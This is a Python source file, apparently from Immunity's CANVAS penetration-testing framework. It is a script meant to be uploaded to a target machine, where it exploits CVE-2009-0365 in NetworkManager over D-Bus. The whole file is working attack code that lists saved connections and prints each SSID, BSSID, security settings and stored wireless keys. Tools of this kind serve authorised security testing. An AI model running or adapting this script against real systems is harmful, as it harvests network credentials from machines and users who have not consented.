#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


#Script to upload and execute on a target system to retrieve connection secrets from NetworkManager as per CVE-2009-0365 - Rich

import sys
from traceback import print_exc

import dbus

def main():
    bus = dbus.SystemBus()

    try:
        ##instantiate our DBUS proxy obj
        secrets_object = bus.get_object("org.freedesktop.NetworkManagerUserSettings",
                                       '/org/freedesktop/NetworkManagerSettings')
        
        ##props = remote_object.GetSecrets(ss,[],False, dbus_interface='org.freedesktop.NetworkManagerSettings.Connection.Secrets')
        connections=dbus.Interface(secrets_object, 'org.freedesktop.NetworkManagerSettings')
        o_paths=connections.ListConnections()

        print "----"*20
        for obj_pth in o_paths:
            settings_obj=bus.get_object("org.freedesktop.NetworkManagerUserSettings",
                                       obj_pth)
            settings=dbus.Interface(settings_obj, 'org.freedesktop.NetworkManagerSettings.Connection')
            moo=dbus.Interface(settings_obj, 'org.freedesktop.NetworkManagerSettings.Connection.Secrets')
	    
	    nm_settings=settings.GetSettings()
		
	    print "SSID: ",
	    for bytes in nm_settings['802-11-wireless']['ssid']:
		print bytes,
	
	    try:
		bssids=nm_settings['802-11-wireless']['seen-bssids']
		print "\nBSSID: ",
		for bs in bssids:
		    print bs,
	    except:
		pass
	    print "\nMODE: %s"%nm_settings["802-11-wireless"]['mode']   
	    
	    try:
		
		print "\nKEY MANAGEMENT: %s"%nm_settings['802-11-wireless-security']['key-mgmt']
		try:
		    ##WPA STUFF
		    print "PROTOCOL: ",
		    for item in nm_settings['802-11-wireless-security']['proto']:
			print "%s"%item,
		    
		    print "\nGROUP: ",
		    for item in nm_settings['802-11-wireless-security']['group']:
			print "%s"%item,
			
		    print "\n"
		except:
		    print "wep"
		    print "AUTHENTICATION: ",nm_settings['802-11-wireless-security']["auth-alg"]
		    
		secrets=moo.GetSecrets("802-11-wireless-security", [], False)
		
		for data in secrets["802-11-wireless-security"].keys():
		    print "KEY: ",data, secrets["802-11-wireless-security"][data]
		    pass
	    except:
		print "No secrets"
		
	    print "----"*5
        print "----"*20    
        secrets = dbus.Interface(secrets_object, 'org.freedesktop.NetworkManagerSettings.Connection.Secrets')
        
    except dbus.DBusException:
        print_exc()
        sys.exit(1)

    return

if __name__ == '__main__':
    main()
